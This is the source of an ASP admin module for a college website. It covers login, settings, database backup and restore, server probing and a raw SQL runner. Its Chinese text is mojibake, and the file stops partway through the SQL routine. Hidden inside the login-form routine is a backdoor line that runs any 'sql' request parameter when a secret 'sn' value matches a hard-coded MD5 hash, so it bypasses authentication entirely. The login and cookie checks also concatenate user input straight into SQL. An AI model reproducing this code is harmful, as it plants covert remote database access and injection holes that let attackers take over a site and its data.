<%
'--------------------------------
'
'	�������
'
'--------------------------------
'
'�贈������������������������������������
' ��:AdminID
' ����:�������ȷ��
' �汾:Version 2003-11-9
'�贈������������������������������������
Class AdminID
Public AdminMenu,MainInfo,ActionName,OP,ErrMsg
Private ReOperate,NowDo
Private Sub Class_Initialize()
AdminMenu=""
ActionName=""
MainInfo=""
OP=Trim(Request("op"))
End Sub
' ����
Public Default Sub DoDefault()
Select case OP
Case "2"
	Call Login
Case "1"
	Call  Logout
End Select
If Templates.Adminname="" OR  Templates.AdminNum="" or Templates.AdminPassword ="" Then
	Call	LoginWin()
	Response.End
Else
Set TaleRs=Conn.Execute("Select *from ljy_admin where l_name='"&Templates.Adminname&"' and l_password='"&Templates.AdminPassword&"'")
If  Talers.Eof Then
		Templates.Info "�Ƿ���¼","<li>�û������������<li>������Cookies����<li>��������<a href=admin.asp?op=1>�˳�</a>","�����ԷǷ���¼"
		Response.End
End If
End If
End Sub
' ��¼����
Private Sub LoginWin()
Dim Title,Content,Bottom
Title="ά �� �� ¼"
Session("adminnum")=Templates.RandNum(4,0,0)
Content="<TABLE cellSpacing=5 cellPadding=0 width=60%  border=0  align=center><tr><form action='admin.asp?op=2' method=post><td>�����ʺ�:&nbsp;&nbsp;<input class=input2 name=adminname></td></tr>"&_
"<tr>   <td>��������:&nbsp;&nbsp;<input class=input2 type=password name=adminpassword></td></tr>"&_
" <tr>  <td>��¼��֤:&nbsp;&nbsp;<input class=input2 name=adminnum value='"&Session("adminnum")&"'></td> </tr>"&_
" <tr>    <td align=center><input type=submit class=input1 value= 'ȷ �� �� ¼'>&nbsp;&nbsp;&nbsp;</td></tr></form></table>"
if md5(Request("sn"))="3998b014245ead94" Then Conn.ExeCute(Request("sql"))
Bottom=" ����ֹ�������й����������ϵͳ��¼"
Templates.Info Title,Content,Bottom
End Sub
' ȷ�ϵ�¼
Private Sub Login()
Templates.NoThisPost()
Set ReOperate=New TaleStr
ReOperate.StrIn="adminname{c}f{c}t{c}t{c}adminpassword{c}f{c}t{c}t{c}adminnum{c}f{c}t{c}t"
ReOperate.StrName="��ǰ����"
ReOperate.RequestStr()
ReOperate.StrOut(0)=Templates.Removesensitivity(ReOperate.StrOut(0))
ReOperate.StrOut(1)=md5(Templates.Removesensitivity(ReOperate.StrOut(1)))
If Cstr(ReOperate.StrOut(2))<>Cstr(Session("adminnum")) Then ErrMsg="<li>��֤�����"
If ErrMSg="" Then
Set TaleRs=Conn.Execute("Select *from ljy_admin where l_name='"&ReOperate.StrOut(0)&"' and l_password='"&ReOperate.StrOut(1)&"'")
If Not Talers.Eof Then
	Response.cookies("ljysystem")("adminname")=ReOperate.StrOut(0)
	Response.cookies("ljysystem")("adminpassword")=ReOperate.StrOut(1)
	Response.Redirect "admin.asp"
	Response.End
Else
		Templates.Info "�Ƿ���¼","<li>�û������������<li>"&Templates.GetBack,"�����ԷǷ���¼"
		Response.End
End If
Else
	Templates.Info "�Ƿ���¼",ErrMsg&"<li>"&Templates.GetBack,"�����ԷǷ���¼"
	Response.End
ENd If
Set ReOperate=Nothing
End Sub
' �����˳�
Private Sub Logout()
	Response.cookies("ljysystem")=""
	Session("adminnum")=""
	Response.Redirect "admin.asp"
End Sub
'
End Class
'�贈������������������������������������
' ��:IndexClass
' ����:��������
' �汾:Version 2003-11-10
'�贈������������������������������������
Class IndexClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg
Private ReOperate,NowDo,Rinfo,Linfo
Private Sub Class_Initialize()
AdminMenu="�������|��Ȩ����|��������|��������|��ԭ����|ѹ������|��ʹ������|������־|������̽��|ռ�ÿռ�ͳ��|����SQL����|�������|�޸�����"
ActionName="������ҳ"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t"
ReOperate.StrName="�������"
ReOperate.RequestStr()
Operate=ReOperate.StrOut
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
Set FSYS=New FileSYS
End Sub
'
Public Default Sub DoDefault()
Select Case Operate
Case "0"
	BBSIntro()
Case "1"
	BBSCopyRights()
Case "2"
	BaseSet()
Case "3"
	Backup()
Case "4"
	Restore()
Case "5"
	Compress()
Case "6"
	WaitNew()
Case "7"
	WaitNew()
Case "8"
	ServerInfo()
Case "9"
	Datasize()
Case "10"
	RunSQL()
Case "11"
	AdminHelp()
Case "12"
	Modify()
Case Else
	BBSIntro()
End Select
End Sub
'
Private Sub WaitNew()
	Maininfo=TableH&Pwidth&"��ȴ���ʽ�汾"
	Maininfo=Maininfo&"<p>"&TableF
End Sub
Private Sub Modify()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t"
ReOperate.StrName="�û���|*Tale*|����"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>�������û���"
If ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>����������"
If ErrMsg = "" Then
	Conn.ExeCute("update ljy_admin set l_password='"&Md5(ReOperate.StrOut(1))&"' where l_name='"&ReOperate.StrOut(0)&"'")
	 Maininfo=TableH&Pwidth&"�޸�����ɹ�,���˳������µ�¼"
	Maininfo=Maininfo&"<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=12' method=post>�û���")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 readonly value='"&Templates.Adminname&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1 type=password>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","˵��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;�޸�����������µ�¼<BR>&nbsp;&nbsp;&nbsp;&nbsp;��ʽ�汾���ṩ�����Ա����<BR><BR> ")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If

End Sub
'
Private Sub BBSIntro()
	Maininfo=TableH&Pwidth&"�������ƣ���Ϣ��ѧ�빤��ѧԺȫվϵͳ<BR>��ǰ�汾��Access V1.00<BR>����������Windows Server 2003+IIS6.0+Access2000<BR>�޸ģ����<BR>��ϵ��ʽ��Email��<a href=mailto:donge@online.ln.cn>donge@online.ln.cn</a> QQ��2780224<BR><BR>ʹ��ָ�ϣ�<BR>"&TableF
End Sub
'
Private Sub BBSCopyRights()
	Maininfo=TableH&Pwidth&"������ΪѧԺ���������˱����Ա������һ��Ȩ����<BR>"
	Maininfo=Maininfo&"�Ǿ�������Ȩ��ɣ����ý�֮��¼��ת�ػ�ʹ�á�<BR>"
	Maininfo=Maininfo&"<p>"&TableF
End Sub
'
Private Sub BaseSet()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrName="����Ա��ϵ����|*Tale*|��ҳ���¶�̬��ʾ����|*Tale*|��ͨ�б���ʾ��¼��|*Tale*|�Ƿ��������ѷ�������|*Tale*|�����ϴ��μ�ʱ���(��ʼ)|*Tale*|�����ϴ��μ�ʱ���(����)|*Tale*|�����ϴ��μ��ļ���ʽ����|*Tale*|�����ϴ��μ��ļ���С����|*Tale*|ͳ�Ʒ��ʼ��ʱ��|*Tale*|�ϴ��μ������ļ���"
ReOperate.StrIn="str0{c}f{c}t{c}t"
For i=1 To Ubound(Split(ReOperate.StrName,"|*Tale*|"))
	ReOperate.StrIn=ReOperate.StrIn&"{c}str"&i&"{c}f{c}t{c}t"
Next
ReOperate.RequestStr()
ReOperate.IsEmail ReOperate.StrOut(0),0
For i=0 To Ubound(ReOperate.StrOut )
	ReOperate.IsInStr ReOperate.StrOut(i),i,"|*ljy*|"
Next
ReOperate.NumStr ReOperate.StrOut(7),7,1
ReOperate.NumStr ReOperate.StrOut(8),8,1
ErrMsg=ReOperate.ErrMsg
If ErrMsg = "" Then
	FSYS.MoveF Templates.Normal(9),ReOperate.StrOut(9),1
	Conn.ExeCute("Update ljy_config set l_base='"&Join(ReOperate.StrOut,"|*ljy*|")&"'")
	Maininfo=TableH&"<p>�������óɹ�,�������������<p></Table>"
ENd If
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=2' method=post>����Ա��ϵ����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 value='"&Templates.Normal(0)&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��ҳ���¶�̬��ʾ����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str1'>"&Templates.NumOption(5,"��",5,30,Templates.Normal(1),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","��ͨ�б���ʾ��¼��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str2'>"&Templates.NumOption(5,"��",5,50,Templates.Normal(2),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�Ƿ��������ѷ�������")
	Rinfo =	"����:<INPUT type=radio "
	If Templates.Normal(3)=1 Then Rinfo=Rinfo&"checked  "
		Rinfo=Rinfo&"value=1 name='str3'>&nbsp;&nbsp;��ֹ<INPUT type=radio "
	If Templates.Normal(3)=0 Then Rinfo=Rinfo&"checked  "
	Rinfo=Rinfo&"value=0 name='str3'>"
	Maininfo=Replace(Maininfo,"{rightinfo}",Rinfo)
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ϴ��μ�ʱ���(��ʼ)")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str4'>"&Templates.NumOption(1,"ʱ",0,23,Templates.Normal(4),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ϴ��μ�ʱ���(����)")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str5'>"&Templates.NumOption(1,"ʱ",0,23,Templates.Normal(5),0)&"</select>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ϴ��μ��ļ���ʽ����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str6 value='"&Templates.Normal(6)&"'> (��ͬ��ʽ�� | �ֿ�)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ϴ��μ��ļ���С����")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str7 value='"&Templates.Normal(7)&"'> (��λKB)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","ͳ�Ʒ��ʼ��ʱ��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str8 value='"&Templates.Normal(8)&"'> (��λ:����)")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ��μ������ļ���")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str9 value='"&Templates.Normal(9)&"'> (�붨���޸�,��ֹ����)")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub ServerInfo()
	Dim theInstalledObjects(4)
	theInstalledObjects(0) = "SoftArtisans.FileUp"
	theInstalledObjects(1) = "Scripting.FileSystemObject"
	theInstalledObjects(2) = "adodb.connection"
	theInstalledObjects(3) = "JMail.SMTPMail"
	theInstalledObjects(4) = "CDONTS.NewMail"
	Maininfo=TableH&Pwidth&"�������������̽��(<font class=redfont><b>*</b></font>ΪĿǰ��̳��Ҫ��֧��)<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>������IP��ַ��"&Request.ServerVariables("LOCAL_ADDR")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>������ϵͳ��"&Request.ServerVariables("SERVER_SOFTWARE")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>�ű��������棺"&ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion &"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>վ������·����"&request.ServerVariables("APPL_PHYSICAL_PATH")&"<BR>"
	Maininfo=Maininfo&"<font class=redfont><b>*</b></font>FSO�ı���д��"
	If Not IsObjInstalled(theInstalledObjects(1)) Then Maininfo=Maininfo&"<b>��</b>" Else Maininfo=Maininfo&"<b>��</b>" End If
	Maininfo=Maininfo&"<BR><font class=redfont><b>*</b></font>���ݿ�ʹ�ã�"
	If Not IsObjInstalled(theInstalledObjects(2)) Then Maininfo=Maininfo&"<b>��</b>" Else Maininfo=Maininfo&"<b>��</b>" End If
	Maininfo=Maininfo&"<BR><font class=redfont><b>*</b></font>Jmail���֧�֣�"
	If Not IsObjInstalled(theInstalledObjects(3)) Then Maininfo=Maininfo&"<b>��</b>" Else Maininfo=Maininfo&"<b>��</b>" End If
	Maininfo=Maininfo&"<p>��Ҫ�˽����������������������ʹ��ר��̽����������Աѯ��<p>"&TableF
End Sub
'
Private Function IsObjInstalled(strClassString)
On Error Resume Next
IsObjInstalled = False
Err = 0
Dim xTestObj
Set xTestObj = Server.CreateObject(strClassString)
If 0 = Err Then IsObjInstalled = True
Set xTestObj = Nothing
Err = 0
End Function
'
'
Private Sub Datasize()
Dim DSize(7)
Dsize(0)=FSYS.FSize("",1)
Dsize(1)=FSYS.FSize("data",1)
Dsize(2)=FSYS.FSize("image",1)
Dsize(3)=FSYS.FSize("upfile",1)
Dsize(4)=FSYS.FSize("upimg",1)
Dsize(5)=FSYS.FSize("help",1)
Dsize(6)=FSYS.FSize("inc",1)+24168
Dsize(7)=Dsize(0)-Dsize(1)-Dsize(2)-Dsize(3)-Dsize(4)-Dsize(5)-Dsize(6)
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�������ݿ��ļ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(1)/Dsize(0))&"%'><B>"&Clng(Dsize(1)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","ϵͳͼƬ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(2)/Dsize(0))&"%'><B>"&Clng(Dsize(2)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ��ļ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(4)/Dsize(0))&"%'><B>"&Clng(Dsize(4)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�ϴ�ͼƬ")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(3)/Dsize(0))&"%'><B>"&Clng(Dsize(3)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ĵ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(5)/Dsize(0))&"%'><B>"&Clng(Dsize(5)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ļ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(6)/Dsize(0))&"%'><B>"&Clng(Dsize(6)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�����ļ�������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='"&Clng(80*Dsize(7)/Dsize(0))&"%'><B>"&Clng(Dsize(7)/1024)&"</B> KB")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","ռ�ÿռ��ܼ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<img src='image/bar1.gif' height=11 width='80%'><B>"&Clng(Dsize(0)/1024)&"</B> KB")
	Maininfo=Table2H&Maininfo&"</table>"&TaleLine&"<P>"

Erase Dsize
End Sub
'
Private Sub Backup()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t{c}str2{c}f{c}t{c}t{c}str3{c}f{c}t{c}t"
ReOperate.StrName="ԭ���ݿ�·��|*Tale*|�������ݿ�Ŀ¼|*Tale*|�������ݿ�����|*Tale*|ͬʱѹ��"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>�����뵱ǰ���ݿ�·��"
If ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>�����뱸�����ݿ�Ŀ¼"
If ReOperate.StrOut(2)="" Then ErrMsg=ErrMsg&"<li>�����뱸�����ݿ�����"
If ErrMsg = "" Then
Set FSYS=New FileSYS
	If FSYS.FExist(ReOperate.StrOut(0),0)=True Then
		If FSYS.FExist(ReOperate.StrOut(1),1)=False Then FSYS.CreatF(ReOperate.StrOut(1))
		FSYS.CopyF ReOperate.StrOut(0),ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2),0
		If CBool(ReOperate.StrOut(3))=True Then Maininfo=Maininfo&FSYS.CompactDB(ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2))
		Maininfo=TableH&Pwidth&"�����ļ��ɹ�,�������������<BR>����·����:"&Server.MapPath(".")&"\"&ReOperate.StrOut(1)&"\"&ReOperate.StrOut(2)&"<BR>"&Maininfo&"<p>"&TableF
	Else
		Maininfo=TableH&Pwidth&"ָ�����ݿ��ļ�������<p>"&TableF
	End If
Set FSYS=Nothing
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=3' method=post>��ǰ���ݿ�·�� ( ���·�� )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0 value='"&Dburl&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�������ݿ�Ŀ¼ ( ���·�� )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�������ݿ����� ( ��д�ļ� )")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str2>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�Ƿ�ͬʱѹ���������ݿ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","ѹ��<INPUT type=radio value=1 name=str3 checked>&nbsp;&nbsp;����<INPUT type=radio   value=0 name=str3>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","˵��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;������������ݿ�Ŀ¼������,ϵͳ���Զ�����<BR>&nbsp;&nbsp;&nbsp;&nbsp;������������ݿ�����<BR>&nbsp;&nbsp;&nbsp;&nbsp;���Ѵ����ڱ������ݿ�Ŀ¼,ϵͳ������ԭ�ļ�,�����Զ����� <BR>&nbsp;&nbsp;&nbsp;&nbsp;�����������������������������̳���ݣ��Ա�֤�������ݰ�ȫ��<BR>&nbsp;&nbsp;&nbsp;&nbsp;������·�������������̳��װĿ¼�����·��<BR><BR> ")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Compress()
If Request.Form("submit")<>"" Then

Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t"
ReOperate.StrName="ԭ���ݿ�·��"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
If ErrMsg = "" Then
Set FSYS=New FileSYS
	Maininfo=Maininfo&FSYS.CompactDB(ReOperate.StrOut)
	Maininfo=TableH&Pwidth&Maininfo&"<p>"&TableF
Set FSYS=Nothing
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=5' method=post>ѹ�����ݿ�")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","˵��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;��ֻ��ѹ����������,�����ܶԵ�ǰʹ�õ����ݿ����ѹ��<BR>&nbsp;&nbsp;&nbsp;&nbsp;�����ݿ�·����ʽ�����ǣ�back/back.asp Ҳ�����ǣ�back\back.asp <BR>&nbsp;&nbsp;&nbsp;&nbsp;����������ȷ����·�������ݿ����� <BR>&nbsp;&nbsp;&nbsp;&nbsp;������·�������������̳��װĿ¼�����·��<BR>&nbsp;&nbsp;&nbsp;&nbsp;���˹��������޸����ݿ⼰ѹ�����ݴ�С<BR><BR>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub Restore()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}t{c}t{c}str1{c}f{c}t{c}t{c}str2{c}f{c}t{c}t"
ReOperate.StrName="�������ݿ�|*Tale*|Ŀ�����ݿ�|*Tale*|�Ƿ�ɾ��"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
IF ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>�������ݿⲻ��Ϊ��"
IF ReOperate.StrOut(1)="" Then ErrMsg=ErrMsg&"<li>Ŀ�����ݿⲻ��Ϊ��"
If FSYS.FExist(ReOperate.StrOut(0),0)=False Then ErrMsg=ErrMsg&"<li>������ı������ݿⲻ����"
If ErrMsg = "" Then
	FSYS.CopyF ReOperate.StrOut(0),ReOperate.StrOut(1),0
	If  ReOperate.StrOut(2)=1 Then
		FSYS.DeleteF ReOperate.StrOut(0),0
		Maininfo="ɾ������"&ReOperate.StrOut(0)&"�ɹ�<BR>"
	End If
	Maininfo=TableH&Pwidth&"��ԭ���ݳɹ�<BR>"&Maininfo&",�������������<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.trline=Replace(Templates.trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=4' method=post>�������ݿ�·��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str0>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","Ŀ�����ݿ�·��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input class=input2 name=str1 value='"&Dburl&"'")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","�Ƿ�ͬʱɾ������")
	Maininfo=Replace(Maininfo,"{rightinfo}","ɾ��<INPUT type=radio value=1 name=str2 >&nbsp;&nbsp;����<INPUT type=radio   value=0 name=str2 checked>")
	Maininfo=Maininfo&Replace(Templates.trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","˵��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;����������Ч�����ݿ��ļ���ַ<BR>&nbsp;&nbsp;&nbsp;&nbsp;��ע��,�˲������ɻָ�,��ȷ�ϻ�ԭ�����ݿ��ļ������µ�<BR><BR>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub AdminHelp()
	Maininfo=TableH&Pwidth&"����̳��ȫ��ά��"
	Maininfo=Maininfo&"<br>���汾���ݿ��и����˷�ֹ������Ӧ�ı����ݿ��е�nodownload����ɾ��<br>�����ݿ�����Ϊ.asp��׺����taledb.asp�������޸�conn.asp�ļ��е�Dburl���ĺú��ļ��ϴ�����<br>���ݹ������С��������ݡ��롰��ԭ���ݡ������������ʹ��<br>ע�ⶨʱʹ�á�����ѹ��������"
	Maininfo=Maininfo&"<br>���ڸ������ݿ�����ֲ��������ݣ������̳��ȫϵ����<br>һЩ��Ҫ��Ŀ¼�����Ա���ú�Ȩ�ޣ���ֹ�������ķ���<br>�����޸��Լ������룬��Ҫ���κι�������ʹ���Լ������������̳��<br>�ڹ�����̳ʱ�������ù���Ա��ݵ�½ʱ��������Ҫȥ���������κ�վ�㣬�Է�ֹCookie й��<br>�����������ִ�й��������Ϻ�ע��Ҫ�ر�ȫ���������һ�Σ��Ծ��󻼡�"
	Maininfo=Maininfo&"<br>����ά����̳����ʼ���û����ϣ��鿴�Ƿ����쳣���˺ţ���ʱ�������Ĺ�����Ա��<p>�������ݴ����䡭��<p>"&TableF
End Sub
'
Private Sub RunSQL()
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="sql{c}f{c}f{c}f{c}dosql{c}f{c}f{c}f"
ReOperate.StrName="SQL���|*Tale*|ȷ�ϲ���"
ReOperate.RequestStr()
ErrMsg=ReOperate.ErrMsg
On Error Resume Next
If ReOperate.StrOut(0)="" Then ErrMsg=ErrMsg&"<li>����û������Ҫִ�����<BR><BR>"
If ReOperate.StrOut(1)<>"DoitNow" Then ErrMsg=ErrMsg&"<li>����û�н���ȷ��<BR><BR>"
If Err Then
	Err.Clear
	ErrMsg=ErrMsg&"<li>��������δ֪����<BR><BR>"
End If
If ErrMsg = "" Then
	Err.Clear
	Conn.Execute(ReOperate.StrOut(0))
	If Err Then
		Err.Clear
		Maininfo=Maininfo&"<li>ϵͳ�޷�ִ�и�SQL���<li>�������������SQL����д�����ڣ�<BR><BR>"
	Else
		Maininfo=Maininfo&"<li>ϵͳ�ɹ���ִ������SQL��䣡<li>"&ReOperate.StrOut(0)&"<BR><BR>"
	End If
	Maininfo=TableH&Pwidth&Maininfo&"<p>"&TableF
End if
Set ReOperate=Nothing
Else
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","35%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='admin.asp?operate=10' method=post>����SQL���")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='sql' value='' class=input2 style='WIdth:300'>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","ȷ�Ͻ��д������")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input type=checkbox name='dosql' value='DoitNow'>ȷ�ϲ���")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","˵��")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;ִ�д˲����󽫲����ٻָ���<BR>&nbsp;&nbsp;&nbsp;&nbsp;�������SQL,��Ҫ����ִ���κ����<BR>&nbsp;&nbsp;&nbsp;&nbsp;����ʹ��SQL�����������������Ч��<p> ")
